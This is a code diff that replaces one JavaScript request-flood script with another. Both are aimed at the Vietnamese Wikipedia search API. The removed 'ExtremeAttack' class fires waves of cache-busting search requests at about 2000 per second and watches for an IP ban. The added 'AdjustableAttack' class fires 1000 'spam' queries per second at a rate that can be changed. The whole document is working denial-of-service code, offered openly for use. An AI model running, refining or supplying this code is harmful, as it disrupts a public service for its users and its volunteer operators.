@@ -1,83 +1,26 @@
-class ExtremeAttack {
+class AdjustableAttack {
     constructor() {
-        this.stats = { totalFired: 0, success200: 0, permanentBan: false };
-        this.attackActive = true;
-        console.log('☢️  2000 REQ/S - EXTREME MODE');
+        this.requestsPerSecond = 1000;
+        this.active = true;
     }
     
-    async launchAttackWave(waveNumber) {
-        const waveSize = 500;
-        const totalWaves = 4;
-        
-        for (let w = 0; w < totalWaves && this.attackActive; w++) {
-            const promises = [];
-            
-            for (let i = 0; i < waveSize; i++) {
-                const uniqueID = Date.now() + Math.random() + waveNumber + w + i;
-                const url = `https://vi.wikipedia.org/w/api.php?action=query&format=json&origin=*&list=search&srsearch=extreme${uniqueID}`;
-                
-                promises.push(
-                    (async () => {
-                        try {
-                            const res = await fetch(url);
-                            this.stats.totalFired++;
-                            if (res.status === 200) {
-                                this.stats.success200++;
-                                if (this.stats.success200 <= 30) {
-                                    console.log(`[${waveNumber}.${w}] ✅ 200`);
-                                }
-                            }
-                            if (res.status === 403 && !this.stats.permanentBan) {
-                                this.stats.permanentBan = true;
-                                console.log(`💀 PERMANENT BAN`);
-                            }
-                        } catch (err) {
-                            this.stats.totalFired++;
-                        }
-                    })()
-                );
-            }
-            
-            Promise.allSettled(promises).catch(() => {});
-            
-            if (w < totalWaves - 1) {
-                await new Promise(resolve => setTimeout(resolve, 0));
-            }
+    fire() {
+        for(let i = 0; i < this.requestsPerSecond; i++) {
+            fetch(`https://vi.wikipedia.org/w/api.php?action=query&format=json&origin=*&list=search&srsearch=spam${Date.now()}${i}`)
+            .catch(()=>{});
         }
     }
     
-    startExtremeAttack() {
-        console.log('🔥 LAUNCHING 2000 REQ/S...\n');
-        let secondCounter = 0;
-        
-        const attackInterval = setInterval(() => {
-            secondCounter++;
-            console.log(`⏰ SECOND ${secondCounter}: ${this.stats.totalFired} req | 200: ${this.stats.success200}`);
-            
-            if (this.stats.permanentBan) {
-                console.log(`🪦 BANNED AT ${secondCounter}s`);
-                clearInterval(attackInterval);
-                this.stop();
-            }
-            
-            this.launchAttackWave(secondCounter);
-            
-        }, 500);
-
-        this.stop = () => {
-            clearInterval(attackInterval);
-            this.attackActive = false;
-            console.log(`\n💀 FINAL AFTER ${secondCounter}s:`);
-            console.log(`   Total: ${this.stats.totalFired}`);
-            console.log(`   200 OK: ${this.stats.success200}`);
-            console.log(`   Rate: ${(this.stats.success200/this.stats.totalFired*100).toFixed(3)}%`);
-            console.log(`   IP BANNED ${this.stats.permanentBan ? 'PERMANENTLY' : 'MIN 1 MONTH'}`);
-        };
+    start() {
+        setInterval(() => this.fire(), 1000);
+    }
+    
+    setRate(rate) {
+        this.requestsPerSecond = rate;
     }
 }
 
-const nuclear = new ExtremeAttack();
-nuclear.startExtremeAttack();
-setTimeout(() => {
-    if (nuclear.stop) nuclear.stop();
-}, 1500000);
+const attack = new AdjustableAttack();
+attack.start();
+
+attack.setRate(1000);
